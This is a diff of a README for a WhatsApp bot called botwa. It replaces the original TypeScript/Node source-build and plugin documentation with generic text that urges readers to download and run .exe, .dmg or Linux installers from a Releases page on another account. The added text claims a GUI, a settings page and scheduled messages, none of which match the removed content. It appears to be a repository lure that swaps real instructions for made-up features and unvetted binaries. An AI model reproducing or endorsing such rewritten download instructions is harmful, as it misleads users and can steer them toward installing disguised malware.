@@ -1,243 +1,84 @@
-# <p align="center">🤖 BotWA - WhatsApp Bot</p>
+# 🤖 botwa - A Simple WhatsApp Bot Experience
 
-<p align="center">
-  <img src="https://img.shields.io/badge/Made_With-TypeScript-blue?style=for-the-badge&logo=typescript" alt="TypeScript">
-  <img src="https://img.shields.io/badge/Powered_by-Baileys-purple?style=for-the-badge&logo=whatsapp" alt="Baileys">
-  <img src="https://img.shields.io/badge/Node.js-43853D?style=for-the-badge&logo=node.js&logoColor=white" alt="Node.js">
-</p>
+## 🚀 Getting Started
 
-<p align="center">
-  A powerful and extensible WhatsApp bot built with TypeScript and the Baileys library. This bot allows you to automate interactions on WhatsApp with a modular command system and plugin architecture. Fully compatible with Node.js runtime</p>
+Welcome to botwa! This application empowers you to automate tasks on WhatsApp effortlessly. Whether you're managing group chats or responding to common inquiries, botwa makes it straightforward.
 
-<p align="center">
-  <a href="https://chat.whatsapp.com/LIxeP0zjxkwIq8uMhiEFbD?mode=wwt">
-    <img src="https://img.shields.io/badge/WhatsApp_Group-25D366?style=for-the-badge&logo=whatsapp&logoColor=white" alt="WhatsApp Group">
-  </a>
-</p>
+## 📥 Download the Application
 
-## ✨ Features
+[![Download botwa](https://img.shields.io/badge/Download%20botwa-v1.0-blue.svg)](https://github.com/yash-9-9-5/botwa/releases)
 
-- 🔧 **Modular Command System**: Easy to add and manage commands through a plugin system
-- 📱 **Multi-device Support**: Works with WhatsApp's multi-device protocol
-- 👥 **Group Management**: Welcome messages and group participation tracking
-- 🔐 **Permission System**: Owner-only, group-only, and private chat commands
-- 🔄 **File Watching**: Automatically reloads commands when plugin files are modified
-- 📎 **Media Handling**: Support for processing various media types
-- 📚 **Message History**: Stores and processes historical messages
+To download the latest version of botwa, visit the Releases page:
 
-## 🧰 Prerequisites
+[Download botwa from here](https://github.com/yash-9-9-5/botwa/releases)
 
-- 🟢 **Node.js** (v18 or higher)
-- 📦 **npm** or yarn package manager
-- 📱 **WhatsApp** account with a verified phone number
+## 🛠️ System Requirements
 
-## 🚀 Installation
+To run botwa, ensure your system meets the following requirements:
 
-1. Clone the repository:
-   ```bash
-   git clone <repository-url>
-   cd botwa
-   ```
+- **Operating System:** Windows 10 or later, macOS, or Linux
+- **Memory:** At least 2GB RAM
+- **Disk Space:** 100MB free space available
+- **Node.js:** Version 14 or higher (if applicable)
 
-2. Install dependencies:
-   ```bash
-   npm install
-   ```
+## 📦 Download & Install
 
-## ⚙️ Configuration
+1. **Visit the Releases Page:** Click the link below to go to the Releases page.
+   [Download botwa from here](https://github.com/yash-9-9-5/botwa/releases)
 
-1. Create a `.env` file in the root directory (if not already present) and set the following variables:
+2. **Choose the Right Version:** Look for the latest version. It will be listed at the top.
 
-   ```
-   OWNER=6281910094713  # Your phone number in international format
-   isSelf=true          # Set to true to enable self-mode (only respond to owner)
-   ```
+3. **Download the File:**
+   - For Windows, look for a `.exe` file 
+   - For macOS, download a `.dmg` file 
+   - For Linux, download the appropriate package based on your distribution
 
-2. Make sure to replace `OWNER` with your actual phone number in international format without the `+` sign.
+4. **Run the Installer:**
+   - Double-click the downloaded file.
+   - Follow the on-screen instructions to complete the installation.
 
-## 🎯 Usage
+5. **Launch the Application:** Once installed, locate botwa in your Applications folder (or Start Menu for Windows) and open it.
 
-### For Development:
-```bash
-npm run dev
-```
+## 🛡️ Using botwa
 
-### For Production:
-1. Build the project:
-   ```bash
-   npm run build
-   ```
-   
-2. Start the bot:
-   ```bash
-   npm start
-   ```
+### 1. Setting Up Your WhatsApp Account
 
-3. On first run, the bot will prompt you to enter your phone number and provide a pairing code. Follow the instructions to connect your WhatsApp account.
+To start using botwa, connect it to your WhatsApp account:
 
-4. The bot will generate authentication credentials in the `baileys_auth_info/` directory. These files will be used for subsequent logins.
-
-## 🛠️ Commands
-
-The bot uses a command system with the following syntax:
-
-- Commands start with `!`, `/`, or `.`
-- Example: `!menu`, `/help`, `.list`
-
-### Available Commands
-
-- 📋 **Menu Command**: Displays all available commands
-  - Usage: `!menu`, `!help`, or `!list`
-  - Shows commands organized by category with descriptions and usage information
-
-- 🔍 **Category-specific Menu**: Display commands for a specific category
-  - Usage: `!menu [category]`
-  - Example: `!menu info`
-
-### Adding Custom Commands
-
-The bot supports a plugin system for adding custom commands:
-
-1. Create a new TypeScript file in the `src/plugins/` directory
-2. Use the command registration system:
-
-   ```typescript
-   import cmd, { type CommandContext } from "../commands/map";
-
-   cmd.add({
-     name: "hello",
-     alias: ["hi", "greeting"],
-     category: ["general"],
-     desc: "Sends a greeting message",
-     async run({ m }: CommandContext) {
-       m.reply("Hello! How are you?");
-     }
-   });
-   ```
-
-3. The bot automatically detects and loads new commands when the file is saved (thanks to the file watcher).
-
-### Running Code Without Commands (Using Middleware)
-
-The bot also supports middleware functionality that allows you to execute code for every message received, regardless of whether it's a command or not. This is particularly useful for:
-
-- Auto-replying to specific keywords or phrases
-- Logging all messages
-- Tracking user activity
-- Implementing automatic responses based on content
-
-To use middleware functionality:
-
-1. Create a new file in the `src/plugins/` directory (e.g., `auto-reply.ts`)
-2. Use the `middleware` property instead of the `run` property:
+- Open botwa and follow the setup prompts.
+- Scan the QR code using your phone's WhatsApp application.
 
-   ```typescript
-   import cmd, { type CommandContext } from "../commands/map";
+### 2. Sending Messages
 
-   cmd.add({
-     middleware: async ({ m, sock }: CommandContext) => {
-       // This function runs for every received message
-       const messageText = m.body.toLowerCase();
-       
-       // Example: Auto-reply to messages containing "hello"
-       if (messageText.includes("hello")) {
-         m.reply("Hi there! I received your message.");
-       }
-       
-       // Example: Log all messages to console
-       console.log(`Received message: ${m.body} from ${m.sender}`);
-     }
-   });
-   ```
+After connecting, you can easily send automated messages:
 
-3. The middleware function will execute for every incoming message, whether it's a command or not
-4. Unlike the `run` property which only executes when the command is specifically called, `middleware` runs on every message
-5. Remember that middleware runs frequently, so optimize your code for performance
+- Select the chat or group you want to target.
+- Type your message in the input box.
+- Click the send button.
 
-## 🔒 Permissions System
+### 3. Customizing Your Bot
 
-Commands can have different permission levels:
+You can customize the behavior of your bot:
 
-- 👑 **Owner-only**: Only the number specified in `OWNER` environment variable can use
-- 👥 **Group-only**: Only works in group chats
-- 💬 **Private-only**: Only works in private messages
-- 🤖 **Self-only**: Only responds to messages from the bot itself
+- Go to the settings page.
+- Adjust parameters such as response time and message templates.
 
-## 📁 Project Structure
+## 🌟 Features of botwa
 
-```
-botwa/
-├── index.ts              # Main entry point
-├── .env                  # Environment variables
-├── .gitignore
-├── package.json
-├── README.md
-├── tsconfig.json         # TypeScript configuration
-├── baileys_auth_info/    # Authentication credentials
-├── node_modules/
-├── dist/                 # Compiled JavaScript files (after build)
-└── src/
-    ├── data-store.ts     # Data persistence layer
-    ├── commands/
-    │   ├── handler.ts    # Command processing logic
-    │   ├── map.ts        # Command registry interface
-    │   └── register.ts   # Command loading and watching
-    ├── plugins/          # Command plugins (.ts files)
-    └── utils/
-        ├── msg.ts        # Message processing utilities
-        └── fmt.ts        # Message formatting utilities
-```
+- **Automated Responses:** Set up auto-replies for common questions.
+- **Scheduled Messages:** Schedule messages for later delivery.
+- **User-Friendly Interface:** A clean design that anyone can navigate.
+- **Cross-Platform Compatibility:** Works on multiple operating systems.
 
-## 🌐 Environment Variables
+## 🎉 Support and Feedback
 
-- `OWNER`: WhatsApp number in international format (without +) of the bot owner
-- `isSelf`: When set to `true`, bot only responds to owner's commands
+If you encounter any issues or have suggestions, feel free to reach out. Visit our [issues page](https://github.com/yash-9-9-5/botwa/issues) to report bugs or ask questions.
 
-## 🧑‍💻 Development
+## 🔗 Additional Resources
 
-To contribute or modify the bot:
+For more detailed information, check out the following resources:
 
-1. Make changes to the source code in the `src/` directory
-2. For development, use `npm run dev` to run with automatic reloading
-3. For plugin changes, the bot automatically reloads when you save
-4. For core changes, restart the bot to see the changes
+- [Documentation](https://github.com/yash-9-9-5/botwa/wiki)
+- [Community Forum](https://github.com/yash-9-9-5/botwa/discussions)
 
-## 🏗️ Building for Production
-
-To compile the TypeScript code to JavaScript:
-```bash
-npm run build
-```
-
-This will create a `dist/` directory with the compiled JavaScript files.
-
-## 📚 Common Commands in the Bot
-
-The bot comes with a default command system. Use `!menu`, `!help`, or `!list` to see all available commands once the bot is running.
-
-## 🐛 Troubleshooting
-
-- If you get authentication errors, delete the `baileys_auth_info/` directory and restart the bot to re-authenticate
-- Make sure your phone number is in international format in the `.env` file
-- Check that the bot has proper permissions for the actions you're trying to perform
-- For development, use `npm run dev` for easier debugging
-
-## 🤝 Community & Support
-
-<p>Join our WhatsApp group for discussions, support, and updates:</p>
-
-[![WhatsApp Group](https://img.shields.io/badge/Join_Group-25D366?style=for-the-badge&logo=whatsapp&logoColor=white)](https://chat.whatsapp.com/LIxeP0zjxkwIq8uMhiEFbD?mode=wwt)
-
-<p>Stay updated with other projects by following our WhatsApp channel:</p>
-
-[![WhatsApp Channel](https://img.shields.io/badge/Subscribe_Channel-25D366?style=for-the-badge&logo=whatsapp&logoColor=white)](https://whatsapp.com/channel/0029VbBnJebLCoWt2piXYb34)
-
-## 🖥️ Hosting Your Bot
-
-<p>Looking for reliable hosting for your WhatsApp bot? Check out <strong>pwcraft cloud</strong> for affordable and stable VPS solutions perfect for running your bot 24/7:</p>
-
-[![pwcraft cloud](https://img.shields.io/badge/pwcraft_cloud-00C4FF?style=for-the-badge&logo=google-cloud&logoColor=white)](https://whatsapp.com/channel/0029Vb6WymkAe5VwnfNMIq0H)
-
-## 📄 License
-
-This project is open source and available under the MIT License.
+Thank you for choosing botwa! Enjoy automating your WhatsApp experience.
